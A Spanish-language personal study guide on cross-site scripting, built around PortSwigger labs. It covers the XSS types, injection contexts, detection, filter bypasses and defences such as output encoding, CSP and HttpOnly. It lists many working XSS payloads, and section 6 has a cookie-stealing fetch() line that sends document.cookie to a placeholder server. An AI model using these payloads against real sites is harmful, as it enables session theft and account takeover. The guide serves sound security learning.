# 🧨 Cross-Site Scripting (XSS) — Referencia completa

> Mi guía de XSS: qué es, los tipos, los contextos donde inyectar, payloads,
> bypass de filtros y cómo se defiende. Documento de consulta (se mira cuando
> se necesita). Basado en los labs de PortSwigger Web Security Academy.

**Nivel OWASP:** parte de *Injection* / *Cross-Site Scripting*. En el top histórico del OWASP.
**Última actualización:** 2026-11-26

---

## 📊 Progreso en los labs (PortSwigger)

**Resueltos: 0 / 30** · (empezando)
Bloques: Reflejado · Almacenado · DOM · Contextos · Bypass de filtros · Explotación.

- [ ] Reflected XSS en HTML sin codificar (apprentice) ← **empezar aquí**
- [ ] Stored XSS en HTML sin codificar (apprentice)
- [ ] DOM XSS en document.write (fuente location.search)
- [ ] DOM XSS en innerHTML
- [ ] XSS en atributo HTML (romper con comillas)
- [ ] XSS en JavaScript string (romper el string)
- [ ] Bypass de filtros (etiquetas/atributos bloqueados)
- [ ] … (iré añadiendo conforme avanzo)

---

## 1 · Qué es y por qué importa

Un **XSS** ocurre cuando una web **refleja datos que controlas** dentro de su HTML/JS
**sin sanearlos**, de modo que el navegador de la víctima **ejecuta tu JavaScript**.

**Impacto:** robar cookies de sesión, hacer acciones como la víctima (CSRF reforzado),
keylogging, defacement, redirigir a phishing, robar tokens. El código corre **en el
navegador de la víctima con su sesión**.

---

## 2 · Los tres tipos

| Tipo | Dónde vive el payload | Cómo llega a la víctima |
|---|---|---|
| **Reflejado** | En la **petición** (parámetro URL/form); la web lo devuelve en la respuesta | Le mandas un enlace trucado |
| **Almacenado** | **Guardado** en el servidor (comentario, perfil, mensaje) | La víctima visita la página normal |
| **DOM-based** | El fallo está en el **JavaScript del cliente** (sink peligroso) | Depende del sink; a veces ni toca el servidor |

---

## 3 · La idea clave: el CONTEXTO

Antes de escribir el payload, mira **dónde cae tu entrada** en la respuesta. El payload
cambia según el contexto:

### 3.1 · Entre etiquetas HTML (contexto más fácil)
```html
<script>alert(1)</script>
```
Si `<script>` está filtrado, usa un manejador de evento con una etiqueta que se dispare sola:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### 3.2 · Dentro de un atributo HTML
Tu entrada cae en `... value="AQUI" ...`. Primero **cierra la comilla y el atributo**:
```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```
Si no puedes escapar de las comillas, inyecta **otro atributo/evento**:
```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```

### 3.3 · Dentro de un string de JavaScript
Tu entrada cae en `var x = 'AQUI';`. **Cierra el string** y mete tu código:
```javascript
'-alert(1)-'
';alert(1)//
</script><script>alert(1)</script>
```

### 3.4 · DOM-based (en el JS del cliente)
Busca **fuentes** (de dónde sale el dato) → **sinks** (dónde se usa de forma peligrosa):
- Fuentes típicas: `location.search`, `location.hash`, `document.referrer`, `window.name`.
- Sinks peligrosos: `innerHTML`, `document.write`, `eval`, `setTimeout`, `location`, jQuery `html()`.
Ejemplo (sink `document.write` con `location.search`):
```
?search="><img src=x onerror=alert(1)>
```

---

## 4 · Cómo detectarlo

1. Inyecta una **marca única** inofensiva, p.ej. `pruebaXSS123`, en cada parámetro/campo.
2. Busca esa marca en la respuesta (Ctrl+F) y mira **en qué contexto** aparece.
3. Prueba a inyectar caracteres clave y mira si se **codifican** o pasan tal cual:
   `< > " ' /`
4. Si pasan sin codificar → monta el payload del contexto correspondiente.
5. Para confirmar ejecución usa `alert(document.domain)` (mejor que `alert(1)`: demuestra
   en qué dominio se ejecuta).

---

## 5 · Bypass de filtros (cuando bloquean cosas)

- **Bloquean `<script>`** → usa `<img onerror>`, `<svg onload>`, `<body onload>`…
- **Bloquean algunos eventos** → prueba otros: `onfocus`, `onmouseover`, `onpointerover`, `onanimationstart`.
- **Mayúsculas/mezclas**: `<ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>`.
- **Sin comillas ni espacios**: `<svg/onload=alert(1)>`.
- **Codificación**: entidades HTML (`&#x61;`…), URL-encoding doble, Unicode.
- **Etiquetas/atributos permitidos**: usa la referencia de PortSwigger
  “XSS cheat sheet” para ver qué combinación de etiqueta+evento sobrevive al filtro.

---

## 6 · Explotación real (más allá del alert)

> Solo en labs / con autorización. El `alert()` es la prueba; esto es lo que haría un atacante.

- **Robo de cookie de sesión** (si no es HttpOnly):
  ```javascript
  <script>fetch('https://TU-SERVIDOR/?c='+document.cookie)</script>
  ```
- **Acción como la víctima** (cambiar email, etc.): hacer que su navegador envíe la petición.
- **Keylogger**, **robo de CSRF token**, **BeEF** para post-explotación.

---

## 7 · Cómo se arregla (la parte de defensor / senior)

- **Codificar la salida** según el contexto (HTML, atributo, JS, URL). Es la defensa nº1.
- **Content-Security-Policy (CSP)**: limita de dónde se carga/ejecuta el JS.
- **HttpOnly** en las cookies de sesión (que el JS no pueda leerlas).
- **Sanitización** con librerías probadas (p.ej. DOMPurify) para HTML que sí debe permitirse.
- **Frameworks** modernos (React/Angular) que escapan por defecto — sin romperlo con `dangerouslySetInnerHTML`/`bypassSecurityTrust`.

---

## 8 · Chuleta rápida
```
<script>alert(document.domain)</script>     -> contexto HTML
"><svg onload=alert(1)>                      -> escapar de un atributo
'-alert(1)-'                                 -> string JS
<img src=x onerror=alert(1)>                 -> si <script> está filtrado
?search=<marca>                              -> localizar el contexto / DOM
```

> Recordatorio ético: todo esto SOLO en labs o con autorización escrita.
